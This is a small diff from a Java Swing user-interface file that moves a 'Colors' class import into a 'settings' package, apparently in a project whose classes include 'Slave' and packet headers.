@@ -17,10 +17,10 @@ import javax.swing.JSlider;
 import javax.swing.JToggleButton;
 import javax.swing.LayoutStyle.ComponentPlacement;
 
-import com.redpois0n.Colors;
 import com.redpois0n.Constants;
 import com.redpois0n.Slave;
 import com.redpois0n.packets.Header;
+import com.redpois0n.settings.Colors;
 import com.redpois0n.threads.ThreadRAM;
 import com.redpois0n.ui.components.JColorBox;
 import com.redpois0n.ui.renderers.MemoryMeter;
